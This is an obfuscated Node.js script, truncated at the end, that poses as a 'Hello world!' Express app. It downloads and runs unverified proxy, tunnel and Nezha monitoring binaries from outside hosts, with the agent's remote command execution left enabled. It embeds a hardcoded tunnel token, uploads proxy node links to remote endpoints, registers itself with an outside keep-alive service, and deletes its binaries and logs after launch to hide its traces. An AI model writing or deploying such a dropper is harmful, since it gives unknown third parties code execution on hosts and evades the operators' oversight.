const _0x4fbd72=_0x94fb;(function(_0x4bdfa9,_0xad3870){const _0x5e1158=_0x94fb,_0x3f9dc3=_0x4bdfa9();while(!![]){try{const _0xf2efbd=parseInt(_0x5e1158(0x209))/0x1*(parseInt(_0x5e1158(0x1dd))/0x2)+parseInt(_0x5e1158(0x1ba))/0x3+parseInt(_0x5e1158(0x19d))/0x4*(parseInt(_0x5e1158(0x190))/0x5)+-parseInt(_0x5e1158(0x189))/0x6+parseInt(_0x5e1158(0x211))/0x7*(parseInt(_0x5e1158(0x20d))/0x8)+-parseInt(_0x5e1158(0x1a7))/0x9*(parseInt(_0x5e1158(0x1f3))/0xa)+-parseInt(_0x5e1158(0x1de))/0xb;if(_0xf2efbd===_0xad3870)break;else _0x3f9dc3['push'](_0x3f9dc3['shift']());}catch(_0x346a23){_0x3f9dc3['push'](_0x3f9dc3['shift']());}}}(_0x4b31,0x637f5));const express=require(_0x4fbd72(0x1e9)),app=express(),axios=require(_0x4fbd72(0x15e)),os=require('os'),fs=require('fs'),path=require(_0x4fbd72(0x178)),{promisify}=require(_0x4fbd72(0x1ad)),exec=promisify(require(_0x4fbd72(0x164))[_0x4fbd72(0x20a)]),{execSync}=require(_0x4fbd72(0x164)),UPLOAD_URL=process[_0x4fbd72(0x1fd)][_0x4fbd72(0x1b5)]||'',PROJECT_URL=process['env'][_0x4fbd72(0x15f)]||'',AUTO_ACCESS=process[_0x4fbd72(0x1fd)]['AUTO_ACCESS']||![],FILE_PATH=process['env']['FILE_PATH']||'./tmp',SUB_PATH=process[_0x4fbd72(0x1fd)]['SUB_PATH']||_0x4fbd72(0x1a5),PORT=process[_0x4fbd72(0x1fd)][_0x4fbd72(0x162)]||process[_0x4fbd72(0x1fd)]['PORT']||0xbb8,UUID=process[_0x4fbd72(0x1fd)][_0x4fbd72(0x18e)]||_0x4fbd72(0x1a8),NEZHA_SERVER=process[_0x4fbd72(0x1fd)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x4fbd72(0x1fd)][_0x4fbd72(0x166)]||'',NEZHA_KEY=process[_0x4fbd72(0x1fd)][_0x4fbd72(0x21f)]||'',ARGO_DOMAIN=process['env'][_0x4fbd72(0x207)]||_0x4fbd72(0x226),ARGO_AUTH=process['env'][_0x4fbd72(0x210)]||_0x4fbd72(0x199),ARGO_PORT=process[_0x4fbd72(0x1fd)][_0x4fbd72(0x1cf)]||0x1f41,CFIP=process[_0x4fbd72(0x1fd)][_0x4fbd72(0x18d)]||_0x4fbd72(0x16c),CFPORT=process[_0x4fbd72(0x1fd)][_0x4fbd72(0x1cb)]||0x1bb,NAME=process[_0x4fbd72(0x1fd)][_0x4fbd72(0x1e0)]||_0x4fbd72(0x201);!fs[_0x4fbd72(0x223)](FILE_PATH)?(fs[_0x4fbd72(0x1c5)](FILE_PATH),console['log'](FILE_PATH+_0x4fbd72(0x1d3))):console['log'](FILE_PATH+_0x4fbd72(0x1bf));function generateRandomName(){const _0x57d4ff=_0x4fbd72,_0x191b6f=_0x57d4ff(0x1fa);let _0x4601c3='';for(let _0x539cc1=0x0;_0x539cc1<0x6;_0x539cc1++){_0x4601c3+=_0x191b6f['charAt'](Math[_0x57d4ff(0x192)](Math[_0x57d4ff(0x1f5)]()*_0x191b6f[_0x57d4ff(0x1b3)]));}return _0x4601c3;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4fbd72(0x215)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x4fbd72(0x215)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x4fbd72(0x194)),listPath=path[_0x4fbd72(0x215)](FILE_PATH,_0x4fbd72(0x198)),bootLogPath=path[_0x4fbd72(0x215)](FILE_PATH,_0x4fbd72(0x174)),configPath=path[_0x4fbd72(0x215)](FILE_PATH,_0x4fbd72(0x187));function deleteNodes(){const _0xf3f03d=_0x4fbd72;try{if(!UPLOAD_URL)return;if(!fs[_0xf3f03d(0x223)](subPath))return;let _0x47228e;try{_0x47228e=fs['readFileSync'](subPath,_0xf3f03d(0x1af));}catch{return null;}const _0x31d351=Buffer[_0xf3f03d(0x1bd)](_0x47228e,_0xf3f03d(0x1fe))[_0xf3f03d(0x181)]('utf-8'),_0x2cf5a3=_0x31d351[_0xf3f03d(0x20b)]('\x0a')['filter'](_0x76732f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xf3f03d(0x1e2)](_0x76732f));if(_0x2cf5a3[_0xf3f03d(0x1b3)]===0x0)return;return axios[_0xf3f03d(0x1c7)](UPLOAD_URL+_0xf3f03d(0x188),JSON['stringify']({'nodes':_0x2cf5a3}),{'headers':{'Content-Type':_0xf3f03d(0x19e)}})[_0xf3f03d(0x163)](_0x1180dc=>{return null;}),null;}catch(_0x30f74f){return null;}}function cleanupOldFiles(){const _0x260473=_0x4fbd72;try{const _0x5a9570=fs[_0x260473(0x225)](FILE_PATH);_0x5a9570[_0x260473(0x222)](_0x558371=>{const _0x293ee1=_0x260473,_0x3d0c9e=path['join'](FILE_PATH,_0x558371);try{const _0x23cd18=fs[_0x293ee1(0x1c8)](_0x3d0c9e);_0x23cd18['isFile']()&&fs[_0x293ee1(0x1e6)](_0x3d0c9e);}catch(_0x492c47){}});}catch(_0x3053e4){}}app['get']('/',function(_0x11a3b6,_0x88d314){const _0x18ea93=_0x4fbd72;_0x88d314['send'](_0x18ea93(0x173));});async function generateConfig(){const _0xa5584=_0x4fbd72,_0x12f38c={'log':{'access':_0xa5584(0x1b1),'error':_0xa5584(0x1b1),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0xa5584(0x214)}],'decryption':_0xa5584(0x1ee),'fallbacks':[{'dest':0xbb9},{'path':_0xa5584(0x1f9),'dest':0xbba},{'path':_0xa5584(0x1f2),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0xa5584(0x1db)}},{'port':0xbb9,'listen':_0xa5584(0x220),'protocol':_0xa5584(0x186),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0xa5584(0x1ee)}},{'port':0xbba,'listen':_0xa5584(0x220),'protocol':_0xa5584(0x186),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0xa5584(0x1ee),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0xa5584(0x17b),_0xa5584(0x171),_0xa5584(0x160)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0xa5584(0x220),'protocol':_0xa5584(0x1dc),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0xa5584(0x1f2)}},'sniffing':{'enabled':!![],'destOverride':['http',_0xa5584(0x171),_0xa5584(0x160)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0xa5584(0x220),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0xa5584(0x183)}},'sniffing':{'enabled':!![],'destOverride':[_0xa5584(0x17b),'tls',_0xa5584(0x160)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0xa5584(0x1f7),'tag':_0xa5584(0x1f8)},{'protocol':_0xa5584(0x1c0),'tag':_0xa5584(0x227)}]};fs[_0xa5584(0x168)](path['join'](FILE_PATH,'config.json'),JSON[_0xa5584(0x217)](_0x12f38c,null,0x2));}function getSystemArchitecture(){const _0xd1bf5d=_0x4fbd72,_0x3f21f0=os[_0xd1bf5d(0x208)]();return _0x3f21f0==='arm'||_0x3f21f0==='arm64'||_0x3f21f0==='aarch64'?_0xd1bf5d(0x21b):_0xd1bf5d(0x1d7);}function downloadFile(_0x2b7805,_0x57e2fa,_0x25b5dc){const _0x57715c=_0x4fbd72,_0x55b533=_0x2b7805;!fs[_0x57715c(0x223)](FILE_PATH)&&fs[_0x57715c(0x1c5)](FILE_PATH,{'recursive':!![]});const _0x550e99=fs['createWriteStream'](_0x55b533);axios({'method':_0x57715c(0x1d8),'url':_0x57e2fa,'responseType':_0x57715c(0x16f)})[_0x57715c(0x216)](_0x14c5c3=>{const _0xca9261=_0x57715c;_0x14c5c3[_0xca9261(0x1ef)][_0xca9261(0x1a2)](_0x550e99),_0x550e99['on'](_0xca9261(0x1ce),()=>{const _0x17918b=_0xca9261;_0x550e99[_0x17918b(0x1e1)](),console[_0x17918b(0x20e)](_0x17918b(0x205)+path['basename'](_0x55b533)+_0x17918b(0x170)),_0x25b5dc(null,_0x55b533);}),_0x550e99['on'](_0xca9261(0x1cc),_0x13284a=>{const _0x29f787=_0xca9261;fs[_0x29f787(0x1a3)](_0x55b533,()=>{});const _0x4d547f=_0x29f787(0x205)+path[_0x29f787(0x19a)](_0x55b533)+_0x29f787(0x1c1)+_0x13284a[_0x29f787(0x1d6)];console[_0x29f787(0x1cc)](_0x4d547f),_0x25b5dc(_0x4d547f);});})[_0x57715c(0x163)](_0x480bea=>{const _0x5211d0=_0x57715c,_0x3fad48='Download\x20'+path[_0x5211d0(0x19a)](_0x55b533)+_0x5211d0(0x1c1)+_0x480bea[_0x5211d0(0x1d6)];console[_0x5211d0(0x1cc)](_0x3fad48),_0x25b5dc(_0x3fad48);});}function _0x94fb(_0x56fb7c,_0x119310){_0x56fb7c=_0x56fb7c-0x15e;const _0x4b3196=_0x4b31();let _0x94fb39=_0x4b3196[_0x56fb7c];return _0x94fb39;}async function downloadFilesAndRun(){const _0x4f04dc=_0x4fbd72,_0x3f1ce0=getSystemArchitecture(),_0x3ddb49=getFilesForArchitecture(_0x3f1ce0);if(_0x3ddb49['length']===0x0){console['log'](_0x4f04dc(0x16a));return;}const _0x5071c6=_0x3ddb49['map'](_0x2c0c54=>{return new Promise((_0xf1459,_0x4b2f22)=>{const _0x1f5dd8=_0x94fb;downloadFile(_0x2c0c54[_0x1f5dd8(0x176)],_0x2c0c54[_0x1f5dd8(0x1ed)],(_0x39fc98,_0x12a998)=>{_0x39fc98?_0x4b2f22(_0x39fc98):_0xf1459(_0x12a998);});});});try{await Promise[_0x4f04dc(0x21e)](_0x5071c6);}catch(_0x1d48b1){console[_0x4f04dc(0x1cc)](_0x4f04dc(0x1ae),_0x1d48b1);return;}function _0x50d75c(_0xc9c918){const _0x10ef53=_0x4f04dc,_0x5d5985=0x1fd;_0xc9c918[_0x10ef53(0x222)](_0x44a6eb=>{const _0x47424c=_0x10ef53;fs[_0x47424c(0x223)](_0x44a6eb)&&fs[_0x47424c(0x1c4)](_0x44a6eb,_0x5d5985,_0x111d45=>{const _0x5e010a=_0x47424c;_0x111d45?console['error'](_0x5e010a(0x17c)+_0x44a6eb+':\x20'+_0x111d45):console['log']('Empowerment\x20success\x20for\x20'+_0x44a6eb+':\x20'+_0x5d5985[_0x5e010a(0x181)](0x8));});});}const _0x4f5aaf=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x50d75c(_0x4f5aaf);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x481cf3=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x4f04dc(0x20b)](':')[_0x4f04dc(0x16e)]():'',_0x56c328=new Set([_0x4f04dc(0x1ea),'8443',_0x4f04dc(0x1ab),_0x4f04dc(0x1ca),'2083',_0x4f04dc(0x1c6)]),_0x1da989=_0x56c328[_0x4f04dc(0x18a)](_0x481cf3)?_0x4f04dc(0x1c9):'false',_0xc82b13=_0x4f04dc(0x212)+NEZHA_KEY+_0x4f04dc(0x184)+NEZHA_SERVER+_0x4f04dc(0x1d0)+_0x1da989+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x4f04dc(0x168)](path[_0x4f04dc(0x215)](FILE_PATH,_0x4f04dc(0x193)),_0xc82b13);const _0x28b871=_0x4f04dc(0x1d2)+phpPath+_0x4f04dc(0x1f0)+FILE_PATH+_0x4f04dc(0x167);try{await exec(_0x28b871),console[_0x4f04dc(0x20e)](phpName+_0x4f04dc(0x20c)),await new Promise(_0x4cc95c=>setTimeout(_0x4cc95c,0x3e8));}catch(_0x48481){console[_0x4f04dc(0x1cc)](_0x4f04dc(0x1bc)+_0x48481);}}else{let _0x155a71='';const _0x3bc665=[_0x4f04dc(0x1ea),_0x4f04dc(0x1d9),_0x4f04dc(0x1ab),'2087',_0x4f04dc(0x203),'2053'];_0x3bc665['includes'](NEZHA_PORT)&&(_0x155a71='--tls');const _0x45cef9=_0x4f04dc(0x1d2)+npmPath+_0x4f04dc(0x1a0)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4f04dc(0x200)+NEZHA_KEY+'\x20'+_0x155a71+_0x4f04dc(0x177);try{await exec(_0x45cef9),console[_0x4f04dc(0x20e)](npmName+_0x4f04dc(0x20c)),await new Promise(_0x2a0517=>setTimeout(_0x2a0517,0x3e8));}catch(_0x5644c1){console[_0x4f04dc(0x1cc)]('npm\x20running\x20error:\x20'+_0x5644c1);}}}else console[_0x4f04dc(0x20e)](_0x4f04dc(0x1f6));const _0x18c1c0=_0x4f04dc(0x1d2)+webPath+'\x20-c\x20'+FILE_PATH+_0x4f04dc(0x1c2);try{await exec(_0x18c1c0),console['log'](webName+_0x4f04dc(0x20c)),await new Promise(_0x4ac64d=>setTimeout(_0x4ac64d,0x3e8));}catch(_0xa6ba99){console[_0x4f04dc(0x1cc)]('web\x20running\x20error:\x20'+_0xa6ba99);}if(fs[_0x4f04dc(0x223)](botPath)){let _0x1cd563;if(ARGO_AUTH[_0x4f04dc(0x1fb)](/^[A-Z0-9a-z=]{120,250}$/))_0x1cd563=_0x4f04dc(0x21a)+ARGO_AUTH;else ARGO_AUTH[_0x4f04dc(0x1fb)](/TunnelSecret/)?_0x1cd563=_0x4f04dc(0x1da)+FILE_PATH+_0x4f04dc(0x1f1):_0x1cd563=_0x4f04dc(0x1eb)+FILE_PATH+_0x4f04dc(0x224)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x1cd563+_0x4f04dc(0x175)),console[_0x4f04dc(0x20e)](botName+_0x4f04dc(0x20c)),await new Promise(_0x10fea0=>setTimeout(_0x10fea0,0x7d0));}catch(_0x22e4a1){console[_0x4f04dc(0x1cc)](_0x4f04dc(0x221)+_0x22e4a1);}}await new Promise(_0x3ad774=>setTimeout(_0x3ad774,0x1388));}function getFilesForArchitecture(_0x79744d){const _0x21740e=_0x4fbd72;let _0x589420;_0x79744d==='arm'?_0x589420=[{'fileName':webPath,'fileUrl':_0x21740e(0x179)},{'fileName':botPath,'fileUrl':_0x21740e(0x1b7)}]:_0x589420=[{'fileName':webPath,'fileUrl':_0x21740e(0x1be)},{'fileName':botPath,'fileUrl':_0x21740e(0x169)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x49651c=_0x79744d===_0x21740e(0x21b)?'https://arm64.ssss.nyc.mn/agent':_0x21740e(0x1aa);_0x589420[_0x21740e(0x1e5)]({'fileName':npmPath,'fileUrl':_0x49651c});}else{const _0x2b1d00=_0x79744d===_0x21740e(0x21b)?'https://arm64.ssss.nyc.mn/v1':_0x21740e(0x1e3);_0x589420['unshift']({'fileName':phpPath,'fileUrl':_0x2b1d00});}}return _0x589420;}function argoType(){const _0x441705=_0x4fbd72;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x441705(0x20e)](_0x441705(0x172));return;}if(ARGO_AUTH[_0x441705(0x19c)](_0x441705(0x18c))){fs['writeFileSync'](path[_0x441705(0x215)](FILE_PATH,_0x441705(0x1ac)),ARGO_AUTH);const _0x3e11f9=_0x441705(0x206)+ARGO_AUTH[_0x441705(0x20b)]('\x22')[0xb]+_0x441705(0x1b6)+path[_0x441705(0x215)](FILE_PATH,_0x441705(0x1ac))+_0x441705(0x1e4)+ARGO_DOMAIN+_0x441705(0x17e)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x441705(0x168)](path[_0x441705(0x215)](FILE_PATH,_0x441705(0x1b0)),_0x3e11f9);}else console[_0x441705(0x20e)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x3c71e4=_0x4fbd72;let _0x324786;if(ARGO_AUTH&&ARGO_DOMAIN)_0x324786=ARGO_DOMAIN,console[_0x3c71e4(0x20e)](_0x3c71e4(0x21d),_0x324786),await _0x5dbaf7(_0x324786);else try{const _0x4ed415=fs[_0x3c71e4(0x1b4)](path[_0x3c71e4(0x215)](FILE_PATH,_0x3c71e4(0x174)),'utf-8'),_0x3a2910=_0x4ed415['split']('\x0a'),_0x464bdb=[];_0x3a2910[_0x3c71e4(0x222)](_0x170b0b=>{const _0x202f7f=_0x3c71e4,_0x6251c6=_0x170b0b[_0x202f7f(0x1fb)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x6251c6){const _0x359e3f=_0x6251c6[0x1];_0x464bdb['push'](_0x359e3f);}});if(_0x464bdb['length']>0x0)_0x324786=_0x464bdb[0x0],console[_0x3c71e4(0x20e)](_0x3c71e4(0x1d1),_0x324786),await _0x5dbaf7(_0x324786);else{console['log'](_0x3c71e4(0x1a1)),fs[_0x3c71e4(0x1e6)](path['join'](FILE_PATH,_0x3c71e4(0x174)));async function _0x3b8350(){const _0x20621b=_0x3c71e4;try{process[_0x20621b(0x185)]===_0x20621b(0x1a9)?await exec(_0x20621b(0x16d)+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName[_0x20621b(0x182)](0x0)+']'+botName[_0x20621b(0x1f4)](0x1)+_0x20621b(0x1ff));}catch(_0xf51700){}}_0x3b8350(),await new Promise(_0x303b21=>setTimeout(_0x303b21,0xbb8));const _0x206d36=_0x3c71e4(0x1eb)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x206d36+_0x3c71e4(0x175)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x17fce1=>setTimeout(_0x17fce1,0xbb8)),await extractDomains();}catch(_0x58ec7e){console[_0x3c71e4(0x1cc)](_0x3c71e4(0x221)+_0x58ec7e);}}}catch(_0x4abe44){console[_0x3c71e4(0x1cc)](_0x3c71e4(0x19f),_0x4abe44);}async function _0x2ac88d(){const _0x474b11=_0x3c71e4;try{const _0x5d0b20=await axios[_0x474b11(0x1d8)](_0x474b11(0x196),{'timeout':0xbb8});if(_0x5d0b20[_0x474b11(0x1ef)]&&_0x5d0b20[_0x474b11(0x1ef)][_0x474b11(0x1e8)]&&_0x5d0b20[_0x474b11(0x1ef)]['org'])return _0x5d0b20['data'][_0x474b11(0x1e8)]+'_'+_0x5d0b20['data']['org'];}catch(_0x1a4851){try{const _0x4cd80b=await axios[_0x474b11(0x1d8)](_0x474b11(0x219),{'timeout':0xbb8});if(_0x4cd80b[_0x474b11(0x1ef)]&&_0x4cd80b[_0x474b11(0x1ef)][_0x474b11(0x1fc)]===_0x474b11(0x1d4)&&_0x4cd80b['data'][_0x474b11(0x213)]&&_0x4cd80b[_0x474b11(0x1ef)][_0x474b11(0x191)])return _0x4cd80b[_0x474b11(0x1ef)][_0x474b11(0x213)]+'_'+_0x4cd80b[_0x474b11(0x1ef)][_0x474b11(0x191)];}catch(_0x18c2d8){}}return _0x474b11(0x16b);}async function _0x5dbaf7(_0x577ba6){const _0x2d9df0=await _0x2ac88d(),_0x369dfb=NAME?NAME+'-'+_0x2d9df0:_0x2d9df0;return new Promise(_0x4103c2=>{setTimeout(()=>{const _0x13ec87=_0x94fb,_0x39f0c9={'v':'2','ps':''+_0x369dfb,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x13ec87(0x1ee),'net':'ws','type':_0x13ec87(0x1ee),'host':_0x577ba6,'path':_0x13ec87(0x202),'tls':_0x13ec87(0x171),'sni':_0x577ba6,'alpn':'','fp':_0x13ec87(0x1a4)},_0x2f12f7=_0x13ec87(0x197)+UUID+'@'+CFIP+':'+CFPORT+_0x13ec87(0x1b8)+_0x577ba6+_0x13ec87(0x1a6)+_0x577ba6+_0x13ec87(0x1bb)+_0x369dfb+_0x13ec87(0x20f)+Buffer[_0x13ec87(0x1bd)](JSON[_0x13ec87(0x217)](_0x39f0c9))['toString'](_0x13ec87(0x1fe))+_0x13ec87(0x165)+UUID+'@'+CFIP+':'+CFPORT+_0x13ec87(0x161)+_0x577ba6+_0x13ec87(0x1a6)+_0x577ba6+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x369dfb+_0x13ec87(0x204);console[_0x13ec87(0x20e)](Buffer[_0x13ec87(0x1bd)](_0x2f12f7)[_0x13ec87(0x181)]('base64')),fs[_0x13ec87(0x168)](subPath,Buffer[_0x13ec87(0x1bd)](_0x2f12f7)[_0x13ec87(0x181)]('base64')),console[_0x13ec87(0x20e)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x413398,_0x45417f)=>{const _0x3f73f6=_0x13ec87,_0x2e1c08=Buffer[_0x3f73f6(0x1bd)](_0x2f12f7)['toString'](_0x3f73f6(0x1fe));_0x45417f[_0x3f73f6(0x1ec)](_0x3f73f6(0x180),_0x3f73f6(0x17f)),_0x45417f['send'](_0x2e1c08);}),_0x4103c2(_0x2f12f7);},0x7d0);});}}function _0x4b31(){const _0xbeabb2=['unlink','firefox','sub','&fp=firefox&type=ws&host=','2595501iGJprC','d5214526-a225-547f-a92d-8171577a0083','win32','https://amd64.ssss.nyc.mn/agent','2096','tunnel.json','util','Error\x20downloading\x20files:','utf-8','tunnel.yml','/dev/null','http\x20server\x20is\x20running\x20on\x20port:','length','readFileSync','UPLOAD_URL','\x0a\x20\x20credentials-file:\x20','https://arm64.ssss.nyc.mn/bot','?encryption=none&security=tls&sni=','/api/add-nodes','508719CqntAk','&path=%2Fvless-argo%3Fed%3D2560#','php\x20running\x20error:\x20','from','https://amd64.ssss.nyc.mn/web','\x20already\x20exists','blackhole','\x20failed:\x20','/config.json\x20>/dev/null\x202>&1\x20&','Error\x20in\x20startserver:','chmod','mkdirSync','2053','post','statSync','true','2087','CFPORT','error','rm\x20-rf\x20','finish','ARGO_PORT','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','ArgoDomain:','nohup\x20','\x20is\x20created','success','response','message','amd','get','8443','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','tcp','vmess','1056326iBvYrX','8048711iMtAfQ','clear','NAME','close','test','https://amd64.ssss.nyc.mn/v1','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','unshift','unlinkSync','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','country_code','express','443','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','set','fileUrl','none','data','\x20-c\x20\x22','/tunnel.yml\x20run','/vmess-argo','10zmSida','substring','random','NEZHA\x20variable\x20is\x20empty,skip\x20running','freedom','direct','/vless-argo','abcdefghijklmnopqrstuvwxyz','match','status','env','base64','\x22\x20>\x20/dev/null\x202>&1','\x20-p\x20','icpt','/vmess-argo?ed=2560','2083','\x0a\x20\x20\x20\x20','Download\x20','\x0a\x20\x20tunnel:\x20','ARGO_DOMAIN','arch','1aeGwXs','exec','split','\x20is\x20running','3747768dBhsuK','log','\x0a\x0avmess://','ARGO_AUTH','7UsnYKl','\x0aclient_secret:\x20','countryCode','xtls-rprx-vision','join','then','stringify','push','http://ip-api.com/json/','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','arm','Nodes\x20uploaded\x20successfully','ARGO_DOMAIN:','all','NEZHA_KEY','127.0.0.1','Error\x20executing\x20command:\x20','forEach','existsSync','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','readdirSync','zero.icpt.dpdns.org','block','axios','PROJECT_URL','quic','?security=tls&sni=','SERVER_PORT','catch','child_process','\x0a\x0atrojan://','NEZHA_PORT','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','writeFileSync','https://amd64.ssss.nyc.mn/bot','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','Unknown','cdns.doon.eu.org','taskkill\x20/f\x20/im\x20','pop','stream','\x20successfully','tls','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Hello\x20world!','boot.log','\x20>/dev/null\x202>&1\x20&','fileName','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','path','https://arm64.ssss.nyc.mn/web','Unhandled\x20error\x20in\x20startserver:','http','Empowerment\x20failed\x20for\x20','https://oooo.serv00.net/add-url','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','text/plain;\x20charset=utf-8','Content-Type','toString','charAt','/trojan-argo','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','platform','vless','config.json','/api/delete-nodes','491964ErsBkU','has','/api/add-subscriptions','TunnelSecret','CFIP','UUID','\x20>/dev/null\x202>&1','290arJJJe','org','floor','config.yaml','sub.txt','App\x20is\x20running','https://ipapi.co/json/','\x0avless://','list.txt','eyJhIjoiY2M5MWJkOWVkZWE5ZmM2NGIxYjQ5MGQzZWJmZDA4Y2YiLCJ0IjoiNzVkNWMxMzctMjAyNS00NmI1LTk5YTMtYTMzMDdhNGMzNmFkIiwicyI6Ik4yTTRZbUUzWWpZdFltRXlNaTAwTldNeExUbG1ZVGd0TkRZNFpEUm1NR05qWWpNeiJ9','basename','filter','includes','23684UHTqux','application/json','Error\x20reading\x20boot.log:','\x20-s\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','pipe'];_0x4b31=function(){return _0xbeabb2;};return _0x4b31();}async function uploadNodes(){const _0x488787=_0x4fbd72;if(UPLOAD_URL&&PROJECT_URL){const _0x2729de=PROJECT_URL+'/'+SUB_PATH,_0x607e77={'subscription':[_0x2729de]};try{const _0x2ee078=await axios[_0x488787(0x1c7)](UPLOAD_URL+_0x488787(0x18b),_0x607e77,{'headers':{'Content-Type':'application/json'}});return _0x2ee078&&_0x2ee078[_0x488787(0x1fc)]===0xc8?(console[_0x488787(0x20e)]('Subscription\x20uploaded\x20successfully'),_0x2ee078):null;}catch(_0x12ce17){if(_0x12ce17[_0x488787(0x1d5)]){if(_0x12ce17[_0x488787(0x1d5)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x488787(0x223)](listPath))return;const _0x128450=fs[_0x488787(0x1b4)](listPath,_0x488787(0x1af)),_0x222b01=_0x128450[_0x488787(0x20b)]('\x0a')[_0x488787(0x19b)](_0x41d5c5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x488787(0x1e2)](_0x41d5c5));if(_0x222b01[_0x488787(0x1b3)]===0x0)return;const _0x513e7c=JSON['stringify']({'nodes':_0x222b01});try{const _0x31f7f9=await axios[_0x488787(0x1c7)](UPLOAD_URL+_0x488787(0x1b9),_0x513e7c,{'headers':{'Content-Type':_0x488787(0x19e)}});return _0x31f7f9&&_0x31f7f9[_0x488787(0x1fc)]===0xc8?(console[_0x488787(0x20e)](_0x488787(0x21c)),_0x31f7f9):null;}catch(_0x2e4d43){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x48a72b=_0x94fb,_0x4d561d=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4d561d[_0x48a72b(0x218)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4d561d[_0x48a72b(0x218)](phpPath);process[_0x48a72b(0x185)]==='win32'?exec('del\x20/f\x20/q\x20'+_0x4d561d[_0x48a72b(0x215)]('\x20')+'\x20>\x20nul\x202>&1',_0x31fe4e=>{const _0x65085a=_0x48a72b;console[_0x65085a(0x1df)](),console[_0x65085a(0x20e)]('App\x20is\x20running'),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x48a72b(0x1cd)+_0x4d561d['join']('\x20')+_0x48a72b(0x18f),_0x3a4a31=>{const _0x59f152=_0x48a72b;console[_0x59f152(0x1df)](),console[_0x59f152(0x20e)](_0x59f152(0x195)),console[_0x59f152(0x20e)](_0x59f152(0x1e7));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x250d66=_0x4fbd72;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x250d66(0x20e)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x1c0ddb=await axios['post'](_0x250d66(0x17d),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x250d66(0x20e)]('automatic\x20access\x20task\x20added\x20successfully'),_0x1c0ddb;}catch(_0x46b5d5){return console[_0x250d66(0x1cc)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x46b5d5[_0x250d66(0x1d6)]),null;}}async 